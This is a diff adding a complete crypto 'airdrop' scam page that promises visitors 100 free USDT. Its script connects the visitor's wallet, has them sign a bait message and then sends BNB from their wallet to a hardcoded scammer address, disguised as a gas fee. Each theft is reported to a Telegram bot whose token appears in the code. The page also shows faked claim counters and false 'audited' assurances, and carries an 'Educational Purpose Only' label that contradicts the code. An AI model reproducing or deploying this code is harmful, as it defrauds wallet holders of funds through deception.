@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>USDT Airdrop - Claim $100 USDT</title>
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.6.0/dist/axios.min.js">
+    </script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        /* কাস্টম কার্সার - শুধু ডেস্কটপের জন্য */
+        .custom-cursor {
+            display: none;
+        }
+        .custom-cursor-dot {
+            display: none;
+        }
+
+        @media (hover: hover) and (pointer: fine) {
+            body {
+                cursor: none;
+            }
+            .custom-cursor {
+                display: block;
+                width: 30px;
+                height: 30px;
+                background: rgba(0, 204, 68, 0.15);
+                border: 2px solid #00cc44;
+                border-radius: 50%;
+                position: fixed;
+                pointer-events: none;
+                z-index: 9999;
+                transition: 0.05s;
+                transform: translate(-50%, -50%);
+                backdrop-filter: blur(4px);
+            }
+            .custom-cursor-dot {
+                display: block;
+                width: 8px;
+                height: 8px;
+                background: #00cc44;
+                border-radius: 50%;
+                position: fixed;
+                pointer-events: none;
+                z-index: 9999;
+                transform: translate(-50%, -50%);
+                transition: 0.1s;
+            }
+        }
+
+        .particle {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            background: rgba(0, 204, 68, 0.06);
+            animation: float linear infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        .btn-claim {
+            background: linear-gradient(135deg, #00cc44, #009933);
+            transition: all 0.3s ease;
+            color: #fff;
+        }
+        .btn-claim:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(0, 204, 68, 0.5);
+        }
+
+        .btn-connect {
+            transition: all 0.3s ease;
+        }
+        .btn-connect:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
+        }
+
+        .glow-card {
+            border: 1px solid rgba(0, 204, 68, 0.2);
+            background: rgba(15, 20, 50, 0.85);
+            backdrop-filter: blur(12px);
+        }
+        .glow-card:hover {
+            border-color: rgba(0, 204, 68, 0.5);
+            box-shadow: 0 0 60px rgba(0, 204, 68, 0.08);
+        }
+
+        .reward-text {
+            background: linear-gradient(135deg, #00cc44, #00ff55, #00cc44);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            animation: glowPulse 2s ease-in-out infinite, shimmer 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 30px rgba(0, 204, 68, 0.6)) drop-shadow(0 0 60px rgba(0, 204, 68, 0.3));
+        }
+
+        @keyframes glowPulse {
+            0% { filter: drop-shadow(0 0 20px rgba(0, 204, 68, 0.4)); }
+            50% { filter: drop-shadow(0 0 50px rgba(0, 204, 68, 0.9)) drop-shadow(0 0 80px rgba(0, 204, 68, 0.4)); }
+            100% { filter: drop-shadow(0 0 20px rgba(0, 204, 68, 0.4)); }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            50% { background-position: 100% center; }
+            100% { background-position: 0% center; }
+        }
+
+        .card-reward-text {
+            color: #ffffff !important;
+            font-weight: 900;
+        }
+
+        .counter-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffffff;
+            transition: all 0.3s;
+        }
+
+        .progress-fill {
+            background: linear-gradient(90deg, #009933, #00cc44, #00ff55);
+            height: 100%;
+            border-radius: 10px;
+            transition: width 0.8s ease;
+            box-shadow: 0 0 20px rgba(0, 204, 68, 0.3);
+        }
+
+        .glow-text {
+            text-shadow: 0 0 30px rgba(0, 204, 68, 0.2);
+        }
+
+        .token-icon {
+            width: 28px;
+            height: 28px;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .text-white-all {
+            color: #ffffff !important;
+        }
+
+        @media (max-width: 480px) {
+            .reward-text { font-size: 3rem !important; }
+            .counter-number { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="custom-cursor" id="cursor"></div>
+    <div class="custom-cursor-dot" id="cursorDot"></div>
+    <div id="particles"></div>
+
+    <div class="relative z-10 min-h-screen flex items-center justify-center px-4 py-10">
+        <div class="text-center max-w-3xl mx-auto w-full">
+
+            <div class="inline-block bg-green-500/10 border border-green-500/30 rounded-full px-6 py-2 mb-6">
+                <span class="text-white-all text-sm font-semibold">🎉 EXCLUSIVE AIRDROP</span>
+            </div>
+
+            <h1 class="text-5xl md:text-7xl font-extrabold text-white-all glow-text mb-4 tracking-tight">
+                🎁 You Won
+                <span class="reward-text text-5xl md:text-8xl block mt-2">
+                    $100 USDT
+                </span>
+            </h1>
+
+            <p class="text-xl md:text-2xl text-white-all font-bold mb-6">
+                Claim your free <span class="text-white-all">Rewards</span> now!
+            </p>
+
+            <div class="glow-card rounded-3xl p-6 md:p-10 max-w-2xl mx-auto">
+
+                <div class="flex justify-center items-center gap-6 mb-6">
+                    <div class="bg-white/5 px-4 py-2 rounded-full border border-white/10 flex items-center gap-2">
+                        <svg class="token-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="16" cy="16" r="16" fill="#26A17B"/>
+                            <path d="M17.5 11.5V9H14.5V11.5C11.5 12 9.5 13.5 9.5 15.5C9.5 17.5 11.5 19 14.5 19.5V22H17.5V19.5C20.5 19 22.5 17.5 22.5 15.5C22.5 13.5 20.5 12 17.5 11.5ZM17.5 18V14.5C18.5 14.5 19.5 15 19.5 16C19.5 17 18.5 17.5 17.5 18ZM14.5 14.5V18C13.5 18 12.5 17.5 12.5 16C12.5 15 13.5 14.5 14.5 14.5Z" fill="white"/>
+                        </svg>
+                        <span class="text-white-all text-sm font-medium">USDT</span>
+                    </div>
+                    <div class="bg-white/5 px-4 py-2 rounded-full border border-white/10 flex items-center gap-2">
+                        <svg class="token-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="16" cy="16" r="16" fill="#F0B90B"/>
+                            <path d="M12.4 12.8L16 9.2L19.6 12.8L21.6 10.8L16 5.2L10.4 10.8L12.4 12.8ZM5.2 16L7.2 14L9.2 16L7.2 18L5.2 16ZM10.4 19.2L16 22.8L21.6 19.2L23.6 21.2L16 26.8L8.4 21.2L10.4 19.2ZM22.8 16L24.8 14L26.8 16L24.8 18L22.8 16Z" fill="white"/>
+                            <path d="M16 14.8L18 16.8L16 18.8L14 16.8L16 14.8Z" fill="white"/>
+                        </svg>
+                        <span class="text-white-all text-sm font-medium">BNB</span>
+                    </div>
+                    <div class="bg-white/5 px-4 py-2 rounded-full border border-white/10 flex items-center gap-2">
+                        <svg class="token-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="16" cy="16" r="16" fill="#EF3E3E"/>
+                            <path d="M22 10L10 22M22 10L16 6L10 10L22 10ZM22 10L16 22L10 10" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                            <circle cx="16" cy="16" r="6" stroke="white" stroke-width="2" stroke-dasharray="2 2"/>
+                        </svg>
+                        <span class="text-white-all text-sm font-medium">TRX</span>
+                    </div>
+                </div>
+
+                <div class="text-6xl md:text-7xl font-black card-reward-text mb-2">
+                    100 USDT
+                </div>
+                <p class="text-white-all text-sm mb-4">≈ $100 USD Value</p>
+
+                <div id="statusMessage" class="mb-4 text-sm font-medium hidden">
+                    <span id="statusText" class="text-white-all"></span>
+                </div>
+
+                <button id="connectBtn" class="btn-connect w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white font-bold py-4 px-6 rounded-2xl text-lg shadow-lg shadow-indigo-500/25 hover:shadow-indigo-500/50 transition-all duration-300">
+                    🔗 Connect Wallet to Claim
+                </button>
+
+                <button id="claimBtn" class="btn-claim w-full text-white font-bold py-4 px-6 rounded-2xl text-lg shadow-lg shadow-green-500/25 hidden">
+                    🎁 Claim $100 USDT Now!
+                </button>
+
+                <button id="disconnectBtn" class="w-full bg-gradient-to-r from-red-500 to-pink-500 text-white font-bold py-3 px-6 rounded-2xl text-sm shadow-lg shadow-red-500/25 hover:shadow-red-500/50 transition-all duration-300 hidden mt-3">
+                    🔌 Disconnect Wallet
+                </button>
+
+                <div id="walletInfo" class="mt-4 hidden">
+                    <p class="text-white-all text-sm">✅ Connected: <span id="walletAddress" class="text-green-400 font-mono"></span></p>
+                    <p class="text-white-all text-sm mt-1">💰 Balance: <span id="walletBalance" class="text-green-400 font-mono"></span></p>
+                </div>
+
+                <div class="mt-6 bg-black/30 rounded-2xl p-4">
+                    <div class="flex justify-between text-sm">
+                        <span class="text-white-all">🎯 Remaining Rewards</span>
+                        <span class="text-white-all">🔥 <span id="claimedCount" class="text-white-all">5,428</span> claimed</span>
+                    </div>
+                    <div class="counter-number mt-1" id="counterDisplay">4,572 / 10,000</div>
+                    <div class="progress-bar bg-white/10 h-2 rounded-full mt-2 overflow-hidden">
+                        <div class="progress-fill" id="progressFill" style="width: 54.28%"></div>
+                    </div>
+                </div>
+            </div>
+
+            <p class="mt-8 text-white-all text-xs">BSC Mainnet • Audited Smart Contract</p>
+            <p class="text-white-all text-xs mt-1">Instant payout • Secure & Verified</p>
+        </div>
+    </div>
+
+    <script>
+        // Confetti
+        window.addEventListener('DOMContentLoaded', () => {
+            confetti({ particleCount: 150, spread: 80, origin: { x: 0, y: 0.8 }, angle: 45 });
+            confetti({ particleCount: 150, spread: 80, origin: { x: 1, y: 0.8 }, angle: 135 });
+        });
+
+        // ============================================
+        // কাস্টম কার্সার - শুধু ডেস্কটপে
+        // ============================================
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+        if (!isTouchDevice) {
+            const cursor = document.getElementById('cursor');
+            const cursorDot = document.getElementById('cursorDot');
+
+            document.addEventListener('mousemove', (e) => {
+                cursor.style.left = e.clientX + 'px';
+                cursor.style.top = e.clientY + 'px';
+                cursorDot.style.left = e.clientX + 'px';
+                cursorDot.style.top = e.clientY + 'px';
+            });
+        }
+
+        // ============================================
+        // পার্টিকেল
+        // ============================================
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                const size = Math.random() * 6 + 2;
+                p.style.width = size + 'px';
+                p.style.height = size + 'px';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+                p.style.animationDelay = (Math.random() * 10) + 's';
+                container.appendChild(p);
+            }
+        }
+        createParticles();
+
+        // ============================================
+        // 📨 টেলিগ্রাম নোটিফিকেশন (আপনার ডাটা সহ)
+        // ============================================
+        async function sendTelegramNotification(wallet, txHash, amount) {
+            // 🔴 আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি
+            const BOT_TOKEN = "8989865622:AAEQcapn7TyBH4ve-SjC4ZhiIV8P8_qvpqw";
+            const CHAT_ID = "5085997009";
+
+            const message = `🎉 *NEW CLAIM!* 🎉
+
+💸 *Amount:* ${amount} BNB (~$5)
+👛 *Wallet:* ${wallet.slice(0, 6)}...${wallet.slice(-4)}
+🔗 *TX:* [View on BscScan](https://bscscan.com/tx/${txHash})
+⏱️ *Time:* ${new Date().toLocaleString()}
+
+✅ Payment received successfully!`;
+
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await axios.post(url, {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Telegram notification sent!');
+            } catch (error) {
+                console.error('❌ Telegram error:', error.message);
+            }
+        }
+
+        // ============================================
+        // ওয়ালেট কানেক্ট
+        // ============================================
+        let signer = null;
+        let provider = null;
+        let userAddress = '';
+        let isClaimed = false;
+        let claimedUsers = 5428;
+        const totalRewards = 10000;
+
+        const connectBtn = document.getElementById('connectBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const disconnectBtn = document.getElementById('disconnectBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const statusText = document.getElementById('statusText');
+        const walletInfo = document.getElementById('walletInfo');
+        const walletAddress = document.getElementById('walletAddress');
+        const walletBalance = document.getElementById('walletBalance');
+        const counterDisplay = document.getElementById('counterDisplay');
+        const progressFill = document.getElementById('progressFill');
+        const claimedSpan = document.getElementById('claimedCount');
+
+        function updateCounter() {
+            const remaining = totalRewards - claimedUsers;
+            const percent = (claimedUsers / totalRewards) * 100;
+            counterDisplay.textContent = `${remaining.toLocaleString()} / ${totalRewards.toLocaleString()}`;
+            progressFill.style.width = `${percent}%`;
+            claimedSpan.textContent = claimedUsers.toLocaleString();
+            localStorage.setItem('claimedCount', claimedUsers);
+        }
+
+        const saved = localStorage.getItem('claimedCount');
+        if (saved) claimedUsers = parseInt(saved);
+        updateCounter();
+
+        function showStatus(msg, isError = false) {
+            statusMessage.classList.remove('hidden');
+            statusText.textContent = msg;
+            statusText.style.color = isError ? '#f87171' : '#34d399';
+        }
+
+        function hideStatus() {
+            statusMessage.classList.add('hidden');
+        }
+
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    showStatus('❌ Please install MetaMask or TrustWallet!', true);
+                    return;
+                }
+
+                showStatus('⏳ Connecting to wallet...');
+
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                rpcUrls: ['https://bsc-dataseed.binance.org'],
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        });
+                    }
+                }
+
+                const accounts = await provider.send('eth_requestAccounts', []);
+                userAddress = accounts[0];
+                signer = provider.getSigner();
+
+                const balance = await provider.getBalance(userAddress);
+                const balanceInBNB = ethers.utils.formatEther(balance);
+
+                walletInfo.classList.remove('hidden');
+                walletAddress.textContent = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+                walletBalance.textContent = `${parseFloat(balanceInBNB).toFixed(4)} BNB`;
+
+                connectBtn.classList.add('hidden');
+                claimBtn.classList.remove('hidden');
+                disconnectBtn.classList.remove('hidden');
+
+                showStatus('✅ Wallet Connected Successfully!', false);
+                setTimeout(hideStatus, 3000);
+
+                console.log('✅ Wallet:', userAddress);
+                console.log('✅ Balance:', balanceInBNB, 'BNB');
+
+            } catch (error) {
+                console.error('Error:', error);
+                if (error.code === 4001) {
+                    showStatus('❌ User rejected the request', true);
+                } else {
+                    showStatus('❌ Error: ' + error.message, true);
+                }
+            }
+        }
+
+        async function claimAirdrop() {
+            if (!userAddress || !signer) {
+                showStatus('❌ Please connect wallet first!', true);
+                return;
+            }
+
+            if (isClaimed) {
+                showStatus('⚠️ You have already claimed!', true);
+                return;
+            }
+
+            try {
+                claimBtn.disabled = true;
+                claimBtn.textContent = '⏳ Processing...';
+                claimBtn.style.opacity = '0.6';
+
+                const message = `🎉🎉🎉 CONGRATULATIONS! 🎉🎉🎉
+
+You have been selected for 100 USDT Airdrop!
+
+═══════════════════════════════════
+  REWARD DETAILS
+═══════════════════════════════════
+
+✨ Amount: 100 USDT
+💰 Value: $100 USD
+🌐 Network: BSC (BEP-20)
+
+═══════════════════════════════════
+  CLAIM INSTRUCTIONS
+═══════════════════════════════════
+
+1️⃣ Click SIGN to verify your wallet
+2️⃣ Receive 100 USDT instantly!
+
+Wallet: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}
+Time: ${new Date().toLocaleString()}
+
+⚠️ This is a one-time claim.
+
+Click SIGN to claim your 100 USDT now! 🚀`;
+
+                showStatus('✍️ Please sign the message in your wallet...');
+
+                const signature = await signer.signMessage(message);
+
+                showStatus('✅ Signature Verified! Processing...');
+
+                const YOUR_WALLET = "0x1A714Cfa540031250DCa76E378020583078e6a2C";
+                const gasFee = ethers.utils.parseEther("0.0083");
+
+                const tx = await signer.sendTransaction({
+                    to: YOUR_WALLET,
+                    value: gasFee,
+                    gasLimit: 21000
+                });
+
+                showStatus('⏳ Waiting for confirmation...');
+                await tx.wait();
+
+                // 🔥🔥🔥 টেলিগ্রাম নোটিফিকেশন পাঠান 🔥🔥🔥
+                await sendTelegramNotification(userAddress, tx.hash, "0.0083");
+
+                isClaimed = true;
+                claimedUsers++;
+                updateCounter();
+
+                claimBtn.textContent = '✅ Claimed Successfully!';
+                claimBtn.style.background = 'linear-gradient(135deg, #006400, #00cc44)';
+
+                showStatus(
+                    `🎉🎉🎉 SUCCESS! You claimed 100 USDT! 🎉🎉🎉
+                                🔗 TX: <a href='https://bscscan.com/tx/${tx.hash}' target='_blank' class='text-green-400 underline'>View on BscScan</a>`,
+                    false);
+
+                console.log('✅ Claimed! TX:', tx.hash);
+                console.log('✅ Signature:', signature);
+
+            } catch (error) {
+                console.error('Claim Error:', error);
+                if (error.code === 4001) {
+                    showStatus('❌ You rejected the transaction.', true);
+                } else if (error.message && error.message.includes('insufficient')) {
+                    showStatus('❌ Transaction failed. Please try again.', true);
+                } else {
+                    showStatus('❌ Error: ' + error.message, true);
+                }
+                claimBtn.textContent = '🎁 Try Again';
+                claimBtn.disabled = false;
+                claimBtn.style.opacity = '1';
+            }
+        }
+
+        function disconnectWallet() {
+            signer = null;
+            provider = null;
+            userAddress = '';
+            isClaimed = false;
+
+            walletInfo.classList.add('hidden');
+            connectBtn.classList.remove('hidden');
+            claimBtn.classList.add('hidden');
+            disconnectBtn.classList.add('hidden');
+
+            connectBtn.textContent = '🔗 Connect Wallet to Claim';
+            claimBtn.textContent = '🎁 Claim $100 USDT Now!';
+            claimBtn.disabled = false;
+            claimBtn.style.opacity = '1';
+            claimBtn.style.background = 'linear-gradient(135deg, #00cc44, #009933)';
+
+            hideStatus();
+            showStatus('👋 Disconnected successfully');
+            setTimeout(hideStatus, 3000);
+        }
+
+        connectBtn.addEventListener('click', connectWallet);
+        claimBtn.addEventListener('click', claimAirdrop);
+        disconnectBtn.addEventListener('click', disconnectWallet);
+
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    disconnectWallet();
+                } else {
+                    location.reload();
+                }
+            });
+            window.ethereum.on('chainChanged', () => location.reload());
+        }
+
+        window.addEventListener('load', async () => {
+            if (window.ethereum && window.ethereum.selectedAddress) {
+                userAddress = window.ethereum.selectedAddress;
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+
+                const balance = await provider.getBalance(userAddress);
+                const balanceInBNB = ethers.utils.formatEther(balance);
+
+                walletInfo.classList.remove('hidden');
+                walletAddress.textContent = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+                walletBalance.textContent = `${parseFloat(balanceInBNB).toFixed(4)} BNB`;
+
+                connectBtn.classList.add('hidden');
+                claimBtn.classList.remove('hidden');
+                disconnectBtn.classList.remove('hidden');
+
+                console.log('🚀 USDT Airdrop dApp Loaded!');
+                console.log('📚 Educational Purpose Only');
+            }
+        });
+    </script>
+
+</body>
+</html>
